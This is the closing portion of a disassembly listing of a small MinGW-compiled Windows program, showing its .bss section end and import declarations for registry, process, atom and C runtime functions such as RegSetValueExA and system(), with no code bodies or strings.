dword_404080	dd ?			; DATA XREF: ___w32_sharedptr_initialize+214w
		align 200h
_bss		ends

;
; Imports from ADVAPI32.DLL
;
; Section 5. (virtual address 00005000)
; Virtual size			: 000003E8 (   1000.)
; Section size in file		: 00000400 (   1024.)
; Offset to raw	data for section: 00001A00
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Externs
; _idata
; LONG __stdcall RegCloseKey(HKEY hKey)
		extrn __imp_RegCloseKey:dword ;	DATA XREF: RegCloseKeyr
; LONG __stdcall RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult)
		extrn __imp_RegOpenKeyExA:dword	; DATA XREF: RegOpenKeyExAr
; LONG __stdcall RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE	*lpData, DWORD cbData)
		extrn __imp_RegSetValueExA:dword ; DATA	XREF: RegSetValueExAr

;
; Imports from KERNEL32.dll
;
; ATOM __stdcall AddAtomA(LPCSTR lpString)
		extrn AddAtomA:dword	; CODE XREF: ___w32_sharedptr_initialize+1CFp
					; DATA XREF: ___w32_sharedptr_initialize+1CFr ...
; void __stdcall ExitProcess(UINT uExitCode)
		extrn __imp_ExitProcess:dword ;	DATA XREF: ExitProcessr
; ATOM __stdcall FindAtomA(LPCSTR lpString)
		extrn FindAtomA:dword	; CODE XREF: ___w32_sharedptr_initialize+A7p
					; ___w32_sharedptr_initialize+1F0p
					; DATA XREF: ...
; UINT __stdcall GetAtomNameA(ATOM nAtom, LPSTR	lpBuffer, int nSize)
		extrn GetAtomNameA:dword ; CODE	XREF: ___w32_sharedptr_get+1Fp
					; DATA XREF: ___w32_sharedptr_get+1Fr ...
; DWORD	__stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename,	DWORD nSize)
		extrn __imp_GetModuleFileNameA:dword ; DATA XREF: GetModuleFileNameAr
; LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)
		extrn __imp_SetUnhandledExceptionFilter:dword
					; DATA XREF: SetUnhandledExceptionFilterr

;
; Imports from msvcrt.dll
;
; int _execl(const char	*, const char *, ...)
		extrn __imp__execl:dword ; DATA	XREF: _execlr

;
; Imports from msvcrt.dll
;
		extrn __imp___getmainargs:dword	; DATA XREF: __getmainargsr
		extrn __imp___p__environ:dword ; DATA XREF: __p__environr
		extrn __imp___p__fmode:dword ; DATA XREF: __p__fmoder
		extrn __set_app_type:dword ; CODE XREF:	start+Dp start+2Dp
					; DATA XREF: ...
; void __cdecl _cexit()
		extrn __imp__cexit:dword ; DATA	XREF: _cexitr
; FILE iob[]
		extrn _iob:dword	; DATA XREF: ___mingw_CRTStartup+5Dr
					; ___mingw_CRTStartup+79r ...
; _onexit_t __cdecl onexit(_onexit_t)
		extrn _onexit:dword	; DATA XREF: __onexit+1r
; int __cdecl _setmode(int, int)
		extrn __imp__setmode:dword ; DATA XREF:	_setmoder
; void __cdecl abort()
		extrn __imp_abort:dword	; DATA XREF: abortr
; int __cdecl atexit(void (__cdecl *)())
		extrn atexit:dword	; DATA XREF: start+41r
; int __cdecl fclose(FILE *)
		extrn __imp_fclose:dword ; DATA	XREF: fcloser
; int __cdecl fflush(FILE *)
		extrn __imp_fflush:dword ; DATA	XREF: fflushr
; FILE *__cdecl	fopen(const char *, const char *)
		extrn __imp_fopen:dword	; DATA XREF: fopenr
; int fprintf(FILE *, const char *, ...)
		extrn __imp_fprintf:dword ; DATA XREF: fprintfr
; void __cdecl free(void *)
		extrn __imp_free:dword	; DATA XREF: freer
; void *__cdecl	malloc(size_t)
		extrn __imp_malloc:dword ; DATA	XREF: mallocr
; void (__cdecl	*__cdecl signal(int, void (__cdecl *)(int)))(int)
		extrn __imp_signal:dword ; DATA	XREF: signalr
; int sprintf(char *, const char *, ...)
		extrn __imp_sprintf:dword ; DATA XREF: sprintfr
; size_t __cdecl strlen(const char *)
		extrn __imp_strlen:dword ; DATA	XREF: strlenr
; int __cdecl system(const char	*)
		extrn __imp_system:dword ; DATA	XREF: systemr


		end start
